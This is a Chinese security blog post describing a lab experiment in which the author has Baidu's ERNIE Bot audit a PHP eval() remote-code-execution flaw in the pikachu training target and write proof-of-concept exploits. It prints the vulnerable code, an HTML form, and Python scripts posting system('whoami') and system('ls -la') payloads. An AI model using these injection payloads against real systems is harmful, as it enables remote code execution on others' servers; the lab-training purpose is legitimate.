#  AI代码审计和POC编写   
原创 道玄安全  道玄网安驿站   2024-11-16 15:25  
  
**“**  
 AI做代码审计和POC编写真好使**”**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPA9bic9zzTydWv4XTTHH2NAiamMp8Kxsh4s2lukPuyuwnia3NiaHkiaU8a3JGFhLvNnYvtLvHTFAd91Rw/640?wx_fmt=png&from=appmsg "")  
  
      
看到了，**关注一下**  
不吃亏啊，点个赞转发一下啦，WP看不下去的，可以B站搜：**标松君**  
，UP主录的打靶视频，欢迎关注。顺便宣传一下星球：**重生者安全，**  
 里面每天会不定期更新**OSCP**  
知识点，**车联网**  
，**渗透红队**  
以及**漏洞挖掘工具**  
等信息分享，欢迎加入；以及想挖**SRC逻辑漏洞**  
的朋友，可以私聊。  
  
  
  
  
  
01  
  
—  
  
  
  
AI代码审计初体验  
  
  
        在看了很多AI模型对代码审计的能力后，小编也想来体验一下AI做代码审计和POC编写的尝试，所以有了一下小实验：  
  
1.实验目标：通过**AI**写出一段**python**编写的**POC**  
  
2.实验工具：**百度文心一言**  
  
3.实验靶机：pikachu  
  
  
  
02  
  
—  
## 实验过程  
  
  
  
    小编选择了pikachu的RCE漏洞，漏洞代码如下：  
```
路径：C:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php

if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";

    }

}
```  
  
  
将代码输入文心一言并附上要求：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yM8MVMVR9fYxCBbOBo9PCaqWKCg6ibKzIicOtPwSdYnpLI3oby2UiaxyzBmFNIcnrc2RanMwbKSxxY5A/640?wx_fmt=png&from=appmsg "")  
  
  
下面是AI给出的html版的代码：  
```
<!DOCTYPE html>
<html>
<head>
    <title>POC: Exploit for eval() vulnerability</title>
</head>
<body>
    <h1>POC: Exploit for eval() vulnerability</h1>
    <form action="http://your-vulnerable-site.com/vulnerable-page.php" method="POST">
        <label for="txt">Enter PHP code to execute:</label>
        <textarea name="txt" id="txt" rows="10" cols="50"><?php echo phpinfo(); ?></textarea><br><br>
        <input type="hidden" name="submit" value="1">
        <input type="submit" value="Submit">
    </form>
</body>
</html>
```  
  
  
小编想要的是python版本的，就继续要求它：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yM8MVMVR9fYxCBbOBo9PCaq8Qsludib0jKe5KibI86oRUTe3oHTJ4EjsrBAd8mcu8E2zv6QAK37Lfqw/640?wx_fmt=png&from=appmsg "")  
  
  
代码如下：  
```
import requests

# 目标网站的 URL
url = "http://your-vulnerable-site.com/vulnerable-page.php"

# 要执行的 PHP 代码（作为字符串发送）
malicious_code = "<?php echo 'Vulnerable!'; system('whoami'); ?>"

# 构建 POST 数据
post_data = {
    'txt': malicious_code,
    'submit': '1'  # 假设后端检查这个字段来确定是否处理请求
}

# 发送 POST 请求
response = requests.post(url, data=post_data)

# 输出响应内容
print(response.text)
```  
  
  
将代码中的URL地址修改一下，试一试，发现不太行，直接用它的payload放进漏洞的输入框发现是失败的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yM8MVMVR9fYxCBbOBo9PCaq1YG1T5jLMRjhQ5m3erm3VOmpzjlcQPjfM06yth5YwIVlcmGQQljL5A/640?wx_fmt=png&from=appmsg "")  
  
  
我们继续要求：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yM8MVMVR9fYxCBbOBo9PCaqVNwJjLJkeJRApfUxIYMetVtFSFneUMOlKLb1WTnnmvbecfCtwKUODQ/640?wx_fmt=png&from=appmsg "")  
  
  
这回它给出的poc是：  
```
import requests

# 目标URL（替换为你的目标URL）
target_url = "http://example.com/vulnerable_script.php"

# 构造POST数据
# 尝试执行一个简单的echo语句
post_data = {
    'submit': '1',  # 确保submit字段存在
    'txt': 'echo "Hello from eval!";'  # 尝试输出字符串
}

# 发送POST请求
response = requests.post(target_url, data=post_data)

# 打印响应内容
print(response.text)
```  
  
直接把payload放到输入框，  
可以正常执行了！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yM8MVMVR9fYxCBbOBo9PCaqnDYIFfCGhY9u4aib4MLeElbdHqaBv493yO6J2kUDLMibzXxKKXjsGlWA/640?wx_fmt=png&from=appmsg "")  
  
  
继续给它要求：  
```
就照着'txt': 'echo "Hello from eval!";' 的格式，写一个system函数的poc
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yM8MVMVR9fYxCBbOBo9PCaqYTu7TOeo5TmiaAJllPsqkUKReJoniaUdVdGdcE1e5IA43zlAIeZyY62Q/640?wx_fmt=png&from=appmsg "")  
  
  
POC如下：  
```
import requests

# 目标URL（替换为你的目标URL）
target_url = "http://example.com/vulnerable_script.php"

# 注意：在Windows系统上，应使用'dir'而不是'ls'
# 构造POST数据，尝试执行system函数列出当前目录内容
# 对于Unix/Linux系统
post_data_unix = {
    'submit': '1',  # 确保submit字段存在
    'txt': 'system("ls -la");'  # 尝试执行ls命令列出目录内容
}

# 对于Windows系统
# post_data_windows = {
#     'submit': '1',
#     'txt': 'system("dir");'  # 尝试执行dir命令列出目录内容
# }

# 选择适当的POST数据（根据你的目标系统）
post_data = post_data_unix  # 或者 post_data_windows

# 发送POST请求
response = requests.post(target_url, data=post_data)

# 打印响应内容
print(response.text)
```  
  
  
由于我的是windows部署的靶机，所以出现了下面的结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yM8MVMVR9fYxCBbOBo9PCaqLfvylgiciaTb39lFPuDwTuxtSVmEoJSbousyx9tdKdMQFsohOicvd05Ug/640?wx_fmt=png&from=appmsg "")  
  
  
  
到现在我已经成功的让AI根据一段代码写出了poc！，不得不说AI做代码审计是天然的优势！  
  
  
  
  
  
**更多精彩内容请扫码关注“重生者安全”星球**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPA9bic9zzTydWv4XTTHH2NAeuqcZvqTz0LHiadOuGVcHz49J7Wl5mAkug4yC75PbuErvyuib90R9l8g/640?wx_fmt=png&from=appmsg "")  
  
****  
免责声明：  
### 本人所有文章均为技术分享，均用于防御为目的的记录，所有操作均在实验环境下进行，请勿用于其他用途，否则后果自负。  
  
第二十七条：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序和工具；明知他人从事危害网络安全的活动，不得为其提供技术支持、广告推广、支付结算等帮助  
  
第十二条：  国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。  
  
任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。  
  
第十三条：  国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。  
  
  
  
  
  
